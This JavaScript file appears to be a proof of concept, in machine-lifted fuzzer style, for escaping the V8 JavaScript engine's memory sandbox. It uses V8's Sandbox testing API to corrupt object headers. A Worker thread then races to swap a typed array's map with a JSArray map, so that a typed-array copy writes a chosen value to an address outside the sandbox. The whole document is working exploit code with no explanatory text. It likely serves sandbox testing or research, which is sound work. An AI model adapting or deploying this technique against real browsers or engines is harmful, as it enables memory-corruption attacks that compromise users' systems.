try {
    const kHeapObjectTag = 1;
    const kJSArrayBufferBackingStoreOffset = 36;
    const kSandboxSizeLog2 = 40;
    const kSandboxedPointerShift = 64 - kSandboxSizeLog2;
    const kHeapNumberValueOffset = 4;
    const kJSArrayLengthOffset = 12;
    const kMapOffset = 0;
    const v17 = Sandbox?.MemoryView;
    let v20;
    try { v20 = new v17(0, 4294967296); } catch (e) {}
    let v21;
    try { v21 = new DataView(v20); } catch (e) {}
    let memory = v21;
    function getPtr(a24) {
        let v25;
        try { v25 = Sandbox.getAddressOf(a24); } catch (e) {}
        return v25 + kHeapObjectTag;
    }
    function getObj(a28) {
        let v29;
        try { v29 = Sandbox.getObjectAt(a28); } catch (e) {}
        return v29;
    }
    function getField(a31, a32) {
        const v34 = (a31 + a32) - kHeapObjectTag;
        let v36;
        try { v36 = memory.getUint32(v34, true); } catch (e) {}
        return v36;
    }
    function getField64(a38, a39) {
        const v41 = (a38 + a39) - kHeapObjectTag;
        let v43;
        try { v43 = memory.getBigUint64(v41, true); } catch (e) {}
        return v43;
    }
    function setField(a45, a46, a47) {
        const v49 = (a45 + a46) - kHeapObjectTag;
        try { memory.setUint32(v49, a47, true); } catch (e) {}
    }
    function setField64(a53, a54, a55) {
        const v57 = (a53 + a54) - kHeapObjectTag;
        try { memory.setBigUint64(v57, a55, true); } catch (e) {}
    }
    function gc() {
        try { new ArrayBuffer(2145386496); } catch (e) {}
    }
    function abptr(a65) {
        let v66;
        try { v66 = getPtr(a65); } catch (e) {}
        let v67;
        try { v67 = getField64(v66, kJSArrayBufferBackingStoreOffset); } catch (e) {}
        let v69;
        try { v69 = BigInt(kSandboxedPointerShift); } catch (e) {}
        let ab_ofs = v67 >> v69;
        const v72 = Sandbox?.base;
        let v73;
        try { v73 = BigInt(v72); } catch (e) {}
        let base = v73 + ab_ofs;
        return base;
    }
    let MAX_TRIES = 20480;
    let v80;
    try { v80 = BigInt("0x424242424240"); } catch (e) {}
    let TARGET = v80;
    let v84;
    try { v84 = BigInt("0x434343434343"); } catch (e) {}
    let VALUE = v84;
    const v87 = WebAssembly?.Memory;
    const v91 = { initial: 32, maximum: 32, shared: true };
    let v92;
    try { v92 = new v87(v91); } catch (e) {}
    let sab = v92?.buffer;
    let v96;
    try { v96 = new BigUint64Array(sab); } catch (e) {}
    let u64s = v96;
    u64s[0] = VALUE;
    let v99;
    try { v99 = new BigUint64Array(1048576); } catch (e) {}
    let u64a = v99;
    let arr = [];
    let v103;
    try { v103 = getPtr(u64s); } catch (e) {}
    let v104;
    try { v104 = getField(v103, kMapOffset); } catch (e) {}
    let kBigUint64ArrayMap = v104;
    let v106;
    try { v106 = getPtr(arr); } catch (e) {}
    let v107;
    try { v107 = getField(v106, kMapOffset); } catch (e) {}
    let kJSArrayMap = v107;
    const v109 = u64a?.buffer;
    let v110;
    try { v110 = abptr(v109); } catch (e) {}
    let ofs_idx_bi = (TARGET - v110) / 8n;
    let v116;
    try { v116 = Number(ofs_idx_bi); } catch (e) {}
    let ofs_idx = v116;
    let v119;
    try { v119 = BigInt(ofs_idx); } catch (e) {}
    if (v119 != ofs_idx_bi) {
        const v121 = `[!] precision loss`;
        try { console.log(v121); } catch (e) {}
    }
    const v130 = -ofs_idx_bi & ((1n << 64n) - 1n);
    let v133;
    try { v133 = BigInt("0x10000"); } catch (e) {}
    const v134 = v130 + v133;
    let v135;
    try { v135 = Number(v134); } catch (e) {}
    let fake_len = v135;
    let v137;
    try { v137 = getPtr(u64s); } catch (e) {}
    let v138;
    try { v138 = getPtr(fake_len); } catch (e) {}
    try { setField(v137, kJSArrayLengthOffset, v138); } catch (e) {}
    let v140;
    try { v140 = getPtr(u64s); } catch (e) {}
    try { setField(v140, kMapOffset, kJSArrayMap); } catch (e) {}
    let v142;
    try { v142 = getPtr(u64s); } catch (e) {}
    let workerScript = `\n  // Prepare corruption utilities.\n  const kHeapObjectTag = 1;\n  const kMapOffset = 0;\n  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));\n  function setField(obj, offset, value) {\n    memory.setUint32(obj + offset - kHeapObjectTag, value, true);\n  }\n  let u64s_ptr = ${v142};\n  let kBigUint64ArrayMap = ${kBigUint64ArrayMap};\n  let kJSArrayMap = ${kJSArrayMap};\n  while (true) {\n    for (let i = 0; i < 0x10; i++) {\n      setField(u64s_ptr, 0, kBigUint64ArrayMap);\n    }\n    setField(u64s_ptr, 0, kBigUint64ArrayMap);\n    setField(u64s_ptr, 0, kJSArrayMap);           // only make it a JSArray for TypedArrayPrototypeSetArray\n    setField(u64s_ptr, 0, kBigUint64ArrayMap);\n    for (let i = 0; i < 0x10; i++) {\n      setField(u64s_ptr, 0, kBigUint64ArrayMap);\n    }\n  }\n`;
    const v147 = { type: "string" };
    let v148;
    try { v148 = new Worker(workerScript, v147); } catch (e) {}
    let worker = v148;
    for (let i151 = 0; i151 < 1000000; i151++) {
    }
    for (let i158 = 0; i158 < MAX_TRIES; i158++) {
        try {
            try { u64a.set(u64s, ofs_idx); } catch (e) {}
        } catch(e164) {
        }
    }
} catch(e165) {
}
